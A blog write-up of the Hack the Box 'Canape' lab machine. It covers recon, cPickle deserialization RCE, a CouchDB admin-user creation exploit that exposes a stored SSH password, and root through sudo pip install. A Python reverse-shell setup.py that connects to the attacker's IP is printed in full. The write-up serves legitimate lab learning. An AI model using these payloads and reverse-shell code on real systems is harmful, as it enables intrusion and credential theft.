<!DOCTYPE html>
<html class="theme-next mist use-motion" lang="en">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">















  
  
  <link href="/assets/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">




  
  
  
  

  

  

  

  

  

  
    
    
    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&amp;subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/assets/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/assets/css/main.css?v=5.1.1" rel="stylesheet" type="text/css">


  <meta name="keywords" content="writeup,pentest,hackthebox,">





  <link rel="alternate" href="/atom.xml" title="fasetto's blog" type="application/atom+xml">




  <link rel="shortcut icon" type="image/x-icon" href="/assets/favicon.ico?v=5.1.1">
















<meta name="robots" content="index, follow">
<meta name="description" content="Hi everyone, In this article I will be doing Canape machine on Hack the Box. Lets start..">
<link rel="canonical" href="http://fasetto.github.io/hack-the-box-canape/">
<meta name="keywords" content="writeup, pentest, hackthebox">
<meta property="og:type" content="article">
<meta property="og:title" content="{Hack the Box} \\ Canape Write-Up">
<meta property="og:url" content="http://fasetto.github.io/hack-the-box-canape/">
<meta property="og:site_name" content="fasetto's blog">
<meta property="og:description" content="Hi everyone, In this article I will be doing Canape machine on Hack the Box. Lets start..">
<meta property="og:locale" content="en">
<meta property="og:image" content="/assets/images/htb-canape.png">
<meta property="og:image" content="/assets/images/htb-canape-web-ui.png">
<meta property="og:image" content="/assets/images/pm2uaEznuvqG01Ths8xVfA.png">
<meta property="og:image" content="/assets/images/1_ffrnrj5K6rrKBJ1zRWPuyw.png">
<meta property="og:image" content="/assets/images/1_TwPKjstuhGUrDey4xM4m-A.png">
<meta property="og:image" content="/assets/images/1_GRvSoUS_zlAZdR8BjeMOog.png">
<meta property="og:image" content="/assets/images/1_UwIXKF_esjrWqgn9l3pmdw.png">
<meta property="og:image" content="/assets/images/1_mhbAJYSEztxNPp9GHNSGjA.png">
<meta property="og:image" content="/assets/images/1_VNIJlcUPp8ld2XxSoPfODw.png">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="{Hack the Box} \\ Canape Write-Up">
<meta name="twitter:description" content="Hi everyone, In this article I will be doing Canape machine on Hack the Box. Lets start..">
<meta name="twitter:image" content="/assets/images/htb-canape.png">


<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '',
    scheme: 'Mist',
    sidebar: {"position":"left","display":"post","offset":12,"offset_float":0,"b2t":false,"scrollpercent":true},
    fancybox: true,
    motion: true,
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>







  <title>{Hack the Box} \\ Canape Write-Up | fasetto's blog</title>
  




<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
  ga('create', 'UA-125815315-1', 'auto');
  ga('send', 'pageview');
</script>













</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="en">

  
  

  <div class="container sidebar-position-left page-post-detail ">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"> <div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">fasetto's blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">SERKAN (@fasetto)</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            Home
          </a>
        </li>
      
        
        
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
            
            Categories
          </a>
        </li>
      
        
        
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
            
            About
          </a>
        </li>
      
        
        
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            Archives
          </a>
        </li>
      
        
        
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            Tags
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
            
            Search
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocomplete="off" placeholder="Searching..." spellcheck="false" type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>



    </div>
  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

<div id="posts" class="posts-expand">
  
  

  

  
  
  

  <article class="post post-type- " itemscope itemtype="http://schema.org/Article">
    <link itemprop="mainEntityOfPage" href="http://fasetto.github.io/hack-the-box-canape/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="fasetto">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/assets/images/avatar-fasetto.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="fasetto's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
          
          
            {Hack the Box} \\ Canape Write-Up
          
        </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-09-15T00:00:00-05:00">
                2018-09-15
              </time>
            

            
              <span class="post-meta-divider">|</span>
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-check-o"></i>
              </span>
              
                <span class="post-meta-item-text">Post modified</span>
              
              <time title="Post modified" itemprop="dateModified" datetime="">
                
              </time>
            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/category/#/write-up" itemprop="url" rel="index">
                    <span itemprop="name">write-up</span>
                  </a>
                </span>

                
                
                  , 
                
              
                
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/category/#/hackthebox" itemprop="url" rel="index">
                    <span itemprop="name">hackthebox</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/hack-the-box-canape/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="/hack-the-box-canape/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          

          
            
            




























            <div class="post-wordcount">
              

              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Reading time</span>
                
                <span title="Reading time">
                  9
                </span>
              
            </div>
          

          
            
                <div class="post-description">
                    
                </div>
            
          

        </div>
      </header>
    

    <div class="post-body" itemprop="articleBody">

      
      

      
        
  
  












  <p><img src="/assets/images/htb-canape.png" alt="repository-pattern.png">
<br></p>
<h1 id="hi-everyone">Hi everyone,</h1>

<p>In this article I will be doing <strong>Canape</strong> machine on <a href="https://hackthebox.eu">Hack the Box</a>. <br>
Lets start..
<!-- more--></p>
<h1 id="enumeration">Enumeration</h1>
<p>First we need to know which ports are open. So lets start with <strong>port-knocking</strong></p>

<div class="highlighter-rouge">
<div class="highlight"><table style="margin: 0px"><tbody><tr>
<td class="gutter"><pre>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16</pre></td>
<td class="code"><pre class="highlight"><code>root@89e502fff05a:~/pentest/hack-the-box/machines/canape# nmap -sS -sC -sV 10.10.10.70 -o scan-01.txt
Nmap scan report for 10.10.10.70
Host is up (0.076s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-git:
|   10.10.10.70:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|     Last commit message: final # Please enter the commit message for your changes. Li...
|     Remotes:
|_      http://git.canape.htb/simpsons.git
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Simpsons Fan Site
|_http-trane-info: Problem with XML parsing of /evox/about
</code></pre></td>
</tr></tbody></table></div>
</div>
<p>As you can see there is a git repo, probably contains source code of the app.
I wanna look at that web page first.</p>

<p><br>
<img src="/assets/images/htb-canape-web-ui.png" alt="canape-web-ui"></p>

<p>Hmm, <strong>CouchDB</strong> looks like interesting. At this point I examined all pages on this site. <br>
And decided to enumerate the directories on this site, so I ran <strong>gobuster</strong>, but didn’t find anything. Because if I go to the page which there isn’t on the site, the app gives me <em>200 ok</em> and shows me a weird random code. Must has a custom error handler.</p>

<p>So I decided to take a look at that git repo I found earlier.
Edited my <code class="highlighter-rouge">/etc/hosts</code> file to access the repo.</p>

<p><img src="/assets/images/pm2uaEznuvqG01Ths8xVfA.png" alt="etc-hosts-file"></p>
<center><i>(By the way, <b>ozzy</b> is my docker container)</i></center>
<p><br></p>
<div class="highlighter-rouge">
<div class="highlight"><table style="margin: 0px"><tbody><tr>
<td class="gutter"><pre>1<br>2<br>3<br>4<br>5<br>6</pre></td>
<td class="code"><pre class="highlight"><code>root@89e502fff05a:~/pentest/hack-the-box/machines/canape# git clone http://git.canape.htb/simpsons.git
Cloning into 'simpsons'...
remote: Counting objects: 49, done.
remote: Compressing objects: 100% (47/47), done.
remote: Total 49 (delta 18), reused 0 (delta 0)
Unpacking objects: 100% (49/49), done.
</code></pre></td>
</tr></tbody></table></div>
</div>

<p><img src="/assets/images/1_ffrnrj5K6rrKBJ1zRWPuyw.png" alt="image"></p>

<p>There it is, <strong>__init__.py</strong><br>
Other files are not important. Just some html and js files.<br>
Now we can examine the source code of the app. I’m using <strong>Visual Studio Code</strong> as my text editor.</p>

<p><img src="/assets/images/1_TwPKjstuhGUrDey4xM4m-A.png" alt="image"></p>

<p><strong>CouchDB</strong> running on http://localhost:5984/ noted. Also there is a <em>custom error handler</em> I talked about it. <br>
But the important one is <strong>cPickle</strong>. Its a <em>built-in python module</em> that allows you to <strong>serialize &amp; deserialize</strong> objects.</p>

<p>Here is the full gist of <strong>__init__.py</strong><br>
https://git.io/fAiTB</p>

<script src="https://gist.github.com/fasetto/96797814faa9789a4787d3365a53a9da.js"> </script>

<p>Inside of the check function <code class="highlighter-rouge">item = cPickle.loads(data)</code> <br></p>

<p>This line will help us to get <strong>RCE (Remote Code Execution)</strong>.
If we post something to http://canape.htb/submit with <em>character</em> and <em>quote</em> parameters that function will create a file in <strong>/tmp</strong> folder. And write our parameters in that file.</p>

<p><code class="highlighter-rouge">outfile = write(char + quote)</code><br>
And than if we post to http://canape.htb/check with parameter <strong>id</strong> that function will load our data.
If our data contains malicious code, also will be executed.<br>
Now we can build our <strong>payload</strong>. But first, character parameter must contain the one of items on the <strong>whitelist</strong>, don’t forget that.
Otherwise we will get <em>500 Internet Server Error.</em></p>

<h1 id="exploitation">Exploitation</h1>
<p><code class="highlighter-rouge">WHITELIST = [ "homer", "marge", "bart", "lisa", "maggie", "moe", "carl", "krusty" ]</code></p>

<p><img src="/assets/images/1_GRvSoUS_zlAZdR8BjeMOog.png" alt="image"></p>

<p>I wrote a simple script to test it if it works..<br>
So I added <strong>“homer”</strong> at the end of my payload. I added at the begining before but when I tried to execute my test script, it didn’t worked.</p>

<p>Ran it and boooom, the command was executed.</p>

<p><img src="/assets/images/1_UwIXKF_esjrWqgn9l3pmdw.png" alt="image"></p>

<p>Than I build a little script to get a <strong>reverse-shell.</strong><br>
Here is the gist link. https://git.io/fAiTU</p>

<p><img src="/assets/images/1_mhbAJYSEztxNPp9GHNSGjA.png" alt="image"></p>

<p><img src="/assets/images/1_VNIJlcUPp8ld2XxSoPfODw.png" alt="image"></p>

<p>Now we are in as www-data user. We can start to enumerate from the inside.<br>
But first lets quickly upgrade our shell.</p>

<blockquote>
  <p>CTRL + Z<br>
stty raw -echo<br>
fg</p>
</blockquote>

<h1 id="further-enumeration">Further Enumeration</h1>
<p>First I want it to check <strong>couchdb</strong>. I didn’t know how to query that database, so I searched on google.</p>

<div class="highlighter-rouge">
<div class="highlight"><table style="margin: 0px"><tbody><tr>
<td class="gutter"><pre>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11</pre></td>
<td class="code"><pre class="highlight"><code>www-data@canape:/$ curl http://localhost:5984
{"couchdb":"Welcome","version":"2.0.0","vendor":{"name":"The Apache Software Foundation"}}

www-data@canape:/$ curl http://localhost:5984/_users/_all_docs
{"error":"unauthorized","reason":"You are not a server admin."}

www-data@canape:/$ curl http://localhost:5984/_all_dbs
["_global_changes","_metadata","_replicator","_users","passwords","simpsons"]

www-data@canape:/$ curl http://localhost:5984/passwords
{"error":"unauthorized","reason":"You are not authorized to access this db."}
</code></pre></td>
</tr></tbody></table></div>
</div>

<blockquote>
  <p>Tip: You can <strong>prettify</strong> that values in <strong>vscode</strong> by pressing <em>CTRL + K F</em><br></p>
</blockquote>

<p>Hmmm thats interesting. There is passwords table, probably with usefull content.<br>
I wanna check it out, but it gives me an error that says I’m not authorized.</p>

<p>At this point, I know the version of <strong>couchdb</strong>, so I searched for common exploits and vulnerabilities.
And I came across with these:</p>

<blockquote>
  <p>https://www.exploit-db.com/exploits/44498/<br>
https://serverfault.com/questions/742184/couchdb-user-creation-without-authentication-standard-behavior</p>
</blockquote>

<div class="highlighter-rouge">
<div class="highlight"><table style="margin: 0px"><tbody><tr>
<td class="gutter"><pre>1<br>2<br>3</pre></td>
<td class="code"><pre class="highlight"><code>www-data@canape:/$ curl -X PUT "http://localhost:5984/_users/org.couchdb.user:pwn" -d '{ "type": "user", "name": "pwn", "roles": ["_admin"], "roles": [], "password": "pwn" }'
&lt;"name": "pwn", "roles": ["_admin"], "roles": [], "password": "pwn" }'
{"ok":true,"id":"org.couchdb.user:pwn","rev":"1-2189e39effa7061778a422d5e9318d21"}
</code></pre></td>
</tr></tbody></table></div>
</div>

<p>Yea, that worked, we added an admin user with name and password pwn .</p>

<div class="highlighter-rouge">
<div class="highlight"><table style="margin: 0px"><tbody><tr>
<td class="gutter"><pre>1<br>2<br>3<br>4<br>5<br>6</pre></td>
<td class="code"><pre class="highlight"><code>www-data@canape:/$ curl http://pwn:pwn@localhost:5984/_users/_all_docs
{"total_rows":3,"offset":0,"rows":[
{"id":"_design/_auth","key":"_design/_auth","value":{"rev":"1-75efcce1f083316d622d389f3f9813f7"}},
{"id":"org.couchdb.user:guest","key":"org.couchdb.user:guest","value":{"rev":"1-76778427e593a7e4a68832b308ed4a5e"}},
{"id":"org.couchdb.user:pwn","key":"org.couchdb.user:pwn","value":{"rev":"1-2189e39effa7061778a422d5e9318d21"}}
]}
</code></pre></td>
</tr></tbody></table></div>
</div>
<p>Lets have a look at <strong>passwords</strong> database:</p>

<div class="highlighter-rouge">
<div class="highlight"><table style="margin: 0px"><tbody><tr>
<td class="gutter"><pre>1<br>2<br>3<br>4<br>5<br>6<br>7</pre></td>
<td class="code"><pre class="highlight"><code>www-data@canape:/$ curl http://pwn:pwn@localhost:5984/passwords/_all_docs
{"total_rows":4,"offset":0,"rows":[
{"id":"739c5ebdf3f7a001bebb8fc4380019e4","key":"739c5ebdf3f7a001bebb8fc4380019e4","value":{"rev":"2-81cf17b971d9229c54be92eeee723296"}},
{"id":"739c5ebdf3f7a001bebb8fc43800368d","key":"739c5ebdf3f7a001bebb8fc43800368d","value":{"rev":"2-43f8db6aa3b51643c9a0e21cacd92c6e"}},
{"id":"739c5ebdf3f7a001bebb8fc438003e5f","key":"739c5ebdf3f7a001bebb8fc438003e5f","value":{"rev":"1-77cd0af093b96943ecb42c2e5358fe61"}},
{"id":"739c5ebdf3f7a001bebb8fc438004738","key":"739c5ebdf3f7a001bebb8fc438004738","value":{"rev":"1-49a20010e64044ee7571b8c1b902cf8c"}}
]}
</code></pre></td>
</tr></tbody></table></div>
</div>

<p>At this point, I spent my time to understand that values. And I spent to much time to figure it out.<br>
Searched on google how to read those.</p>

<p>Than I understand, I didn’t know that base64 values are the actual <strong>id</strong> values like sql table id’s.</p>

<blockquote>
  <p>Tip: http://docs.couchdb.org/en/stable/api/index.html</p>
</blockquote>

<div class="highlighter-rouge">
<div class="highlight"><table style="margin: 0px"><tbody><tr>
<td class="gutter"><pre>1<br>2</pre></td>
<td class="code"><pre class="highlight"><code>www-data@canape:/$ curl http://pwn:pwn@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc4380019e4
{"_id":"739c5ebdf3f7a001bebb8fc4380019e4","_rev":"2-81cf17b971d9229c54be92eeee723296","item":"ssh","password":"0B4jyA0xtytZi7esBNGp","user":""}
</code></pre></td>
</tr></tbody></table></div>
</div>

<p>We got a password.<br>
Lets cat the /etc/passwd for enumerating <strong>users</strong> on system.</p>

<div class="highlighter-rouge">
<div class="highlight"><table style="margin: 0px"><tbody><tr>
<td class="gutter"><pre>1<br>2<br>3</pre></td>
<td class="code"><pre class="highlight"><code>...
homer:x:1000:1000:homer,,,:/home/homer:/bin/bash
...
</code></pre></td>
</tr></tbody></table></div>
</div>

<p>Maybe that password we found belongs to <strong>homer ?</strong></p>

<div class="highlighter-rouge">
<div class="highlight"><table style="margin: 0px"><tbody><tr>
<td class="gutter"><pre>1<br>2<br>3</pre></td>
<td class="code"><pre class="highlight"><code>www-data@canape:/$ su homer
Password:
homer@canape:/$
</code></pre></td>
</tr></tbody></table></div>
</div>

<p>We got <strong>homer</strong> now. <strong>user.txt</strong> is in this home folder.</p>

<h1 id="privilege-escalation">Privilege Escalation</h1>
<p>First lets check <strong>sudo -l</strong></p>

<div class="highlighter-rouge">
<div class="highlight"><table style="margin: 0px"><tbody><tr>
<td class="gutter"><pre>1<br>2<br>3<br>4<br>5<br>6<br>7</pre></td>
<td class="code"><pre class="highlight"><code>homer@canape:~$ sudo -l
[sudo] password for homer:
Matching Defaults entries for homer on canape:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
User homer may run the following commands on canape:
    (root) /usr/bin/pip install *
</code></pre></td>
</tr></tbody></table></div>
</div>

<p>We can install <strong>pip</strong> packages as <strong>root,</strong> great.<br>
I can grab the flag easily, let me show you.</p>

<div class="highlighter-rouge">
<div class="highlight"><table style="margin: 0px"><tbody><tr>
<td class="gutter"><pre>1<br>2<br>3<br>4</pre></td>
<td class="code"><pre class="highlight"><code>homer@canape:~/.root$ sudo pip install -r /root/root.txt
The directory '/home/homer/.cache/pip/http' or its parent directory is not owned by the current user and the cache has been disabled. Please check the permissions and owner of that directory. If executing pip with sudo, you may want sudo's -H flag.
The directory '/home/homer/.cache/pip' or its parent directory is not owned by the current user and caching wheels has been disabled. check the permissions and owner of that directory. If executing pip with sudo, you may want sudo's -H flag.
Collecting xxxxxxxxxxxxxxxxxxxxxxx (from -r /root/root.txt (line 1))
</code></pre></td>
</tr></tbody></table></div>
</div>

<p>Why it worked ? <strong>-r</strong> flag means take all requipments from given txt file. And I gave it <strong>root.txt</strong> <img class="emoji" title=":smiling_imp:" alt=":smiling_imp:" src="https://assets-cdn.github.com/images/icons/emoji/unicode/1f608.png" height="20" width="20" align="absmiddle"> <br>
Then pip want it to collect the first line and <strong>boooom.</strong> <em>(first-line was the flag)</em></p>

<p>And this is other technique for <strong>reverse-shell.</strong> Create empty folder and name it this little script as <strong>setup.py</strong> and run <code class="highlighter-rouge">sudo pip install .</code></p>

<div class="language-py highlighter-rouge">
<div class="highlight"><table style="margin: 0px"><tbody><tr>
<td class="gutter"><pre>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12</pre></td>
<td class="code"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">socket</span>
<span class="kn">import</span> <span class="nn">subprocess</span>
<span class="kn">import</span> <span class="nn">os</span>

<span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">"10.10.14.163"</span><span class="p">,</span><span class="mi">3141</span><span class="p">))</span>

<span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">0</span><span class="p">)</span>
<span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">1</span><span class="p">)</span>
<span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">2</span><span class="p">)</span>

<span class="n">p</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">call</span><span class="p">([</span><span class="s">"/bin/sh"</span><span class="p">,</span><span class="s">"-i"</span><span class="p">])</span>
</code></pre></td>
</tr></tbody></table></div>
</div>

<div class="highlighter-rouge">
<div class="highlight"><table style="margin: 0px"><tbody><tr>
<td class="gutter"><pre>1<br>2<br>3<br>4</pre></td>
<td class="code"><pre class="highlight"><code>homer@canape:~/.root$ sudo pip install .
The directory '/home/homer/.cache/pip/http' or its parent directory is not owned by the current user and the cache has been disabled. Please check the permissions and owner of that directory. If executing pip with sudo, you may want sudo's -H flag.
The directory '/home/homer/.cache/pip' or its parent directory is not owned by the current user and caching wheels has been disabled. check the permissions and owner of that directory. If executing pip with sudo, you may want sudo's -H flag.
Processing /home/homer/.root
</code></pre></td>
</tr></tbody></table></div>
</div>

<p>Listening machine:</p>

<div class="highlighter-rouge">
<div class="highlight"><table style="margin: 0px"><tbody><tr>
<td class="gutter"><pre>1<br>2<br>3<br>4<br>5</pre></td>
<td class="code"><pre class="highlight"><code>root@89e502fff05a:~/pentest/hack-the-box/machines/canape# nc -lvnp 3141
listening on [any] 3141 ...
connect to [10.10.14.163] from (UNKNOWN) [10.10.10.70] 39504
# id
uid=0(root) gid=0(root) groups=0(root)
</code></pre></td>
</tr></tbody></table></div>
</div>

<p>Done, now we are <strong>root</strong>.
It think it was an easy box, but getting the user is a bit hard. Because most of us didn’t knew about couchdb.<br>
I used pouchdb and couchdb together one of my projects but even I didn’t knew how to query it using http api ?!<br>
This box, pushes us to learn some.</p>

<p>See you guys later.</p>



      
    </div>

    <div>
      
        

      
    </div>

    <div>
      
        

      
    </div>

    <div>
      
        

      
    </div>

    <footer class="post-footer">
      
        <div class="post-tags">
          
            
            <a href="/tag/#/writeup" rel="tag"># writeup</a>
          
            
            <a href="/tag/#/pentest" rel="tag"># pentest</a>
          
            
            <a href="/tag/#/hackthebox" rel="tag"># hackthebox</a>
          
        </div>
      

      
      
      
      
      

      
      
        <div class="post-nav" id="post-nav-id">

            <div class="post-nav-prev post-nav-item">
            
                <a href="/mongodb-in-dotnet/" rel="prev" title=".Net MongoDB Kullanımı">
                .Net MongoDB Kullanımı <i class="fa fa-chevron-left"></i>
                </a>
            
            </div>

            <span class="post-nav-divider"></span>

            <div class="post-nav-next post-nav-item">
                
                <a href="/hack-the-box-olympus/" rel="next" title="{Hack the Box} \\ Olympus Write-Up">
                    <i class="fa fa-chevron-right"></i> {Hack the Box} \\ Olympus Write-Up
                </a>
                
            </div>

        </div>
      
      

      
    </footer>
  </article>

  <div class="post-spread">
    
  </div>
</div>


          </div>
          


          
  <div class="comments" id="comments">
    
      <div id="disqus_thread">
        <noscript>
          Please enable JavaScript to view the
          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
        </noscript>
      </div>
    
  </div>


        </div>
        
          

  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      
        
        
        







      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            Table of Contents
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview">
            Overview
          </li>
        </ul>
      

      <section class="site-overview sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <img class="site-author-image" itemprop="image" src="/assets/images/avatar-fasetto.jpg" alt="fasetto">
          <p class="site-author-name" itemprop="name">fasetto</p>
           
              <p class="site-description motion-element" itemprop="description">Back-end Developer, UI &amp; UX Designer</p>
          
        </div>
        <nav class="site-state motion-element">

          
            <div class="site-state-item site-state-posts">
              <a href="/archives/">
                <span class="site-state-item-count">5</span>
                <span class="site-state-item-name">posts</span>
              </a>
            </div>
          

          
            
            
            <div class="site-state-item site-state-categories">
              <a href="/categories/">
                <span class="site-state-item-count">10</span>
                <span class="site-state-item-name">categories</span>
              </a>
            </div>
          

          
            
            
            <div class="site-state-item site-state-tags">
              <a href="/tags/">
                <span class="site-state-item-count">11</span>
                <span class="site-state-item-name">tags</span>
              </a>
            </div>
          

        </nav>

        
        
        
          <div class="feed-link motion-element">
            <a href="/atom.xml" rel="alternate">
              <i class="fa fa-rss"></i>
              RSS
            </a>
          </div>
        

        <div class="links-of-author motion-element">
          
            
              
              
              <span class="links-of-author-item">
                <a href="https://github.com/fasetto" target="_blank" title="GitHub">
                  
                    <i class="fa fa-fw fa-github"></i>
                  
                  GitHub
                </a>
              </span>
            
              
              
              <span class="links-of-author-item">
                <a href="https://www.reddit.com/user/imfasetto" target="_blank" title="Reddit">
                  
                    <i class="fa fa-fw fa-reddit-alien"></i>
                  
                  Reddit
                </a>
              </span>
            
              
              
              <span class="links-of-author-item">
                <a href="https://stackoverflow.com/users/9648420/serkan" target="_blank" title="StackOverFlow">
                  
                    <i class="fa fa-fw fa-globe"></i>
                  
                  StackOverFlow
                </a>
              </span>
            
              
              
              <span class="links-of-author-item">
                <a href="mailto:serkanbircan21@yandex.com" target="_blank" title="Email">
                  
                    <i class="fa fa-fw fa-envelope"></i>
                  
                  Email
                </a>
              </span>
            
              
              
              <span class="links-of-author-item">
                <a href="https://dribbble.com/fasetto" target="_blank" title="Dribble">
                  
                    <i class="fa fa-fw fa-dribbble"></i>
                  
                  Dribble
                </a>
              </span>
            
              
              
              <span class="links-of-author-item">
                <a href="https://www.linkedin.com/in/fasetto/" target="_blank" title="LinkedIn">
                  
                    <i class="fa fa-fw fa-linkedin-square"></i>
                  
                  LinkedIn
                </a>
              </span>
            
          
        </div>

        
        

        
        

        


      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
            
            
            








            
              <div class="post-toc-content">
    <ol class="nav">
      <li class="nav-item nav-level-1"> <a class="nav-link" href="#hi-everyone"> <span class="nav-text">Hi everyone,</span> </a> </li> <li class="nav-item nav-level-1"> <a class="nav-link" href="#enumeration"> <span class="nav-text">Enumeration</span> </a> </li> <li class="nav-item nav-level-1"> <a class="nav-link" href="#exploitation"> <span class="nav-text">Exploitation</span> </a> </li> <li class="nav-item nav-level-1"> <a class="nav-link" href="#further-enumeration"> <span class="nav-text">Further Enumeration</span> </a> </li> <li class="nav-item nav-level-1"> <a class="nav-link" href="#privilege-escalation"> <span class="nav-text">Privilege Escalation</span> </a> </li>
    </ol>
  </div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>

        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">
  
  
  © 
  <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
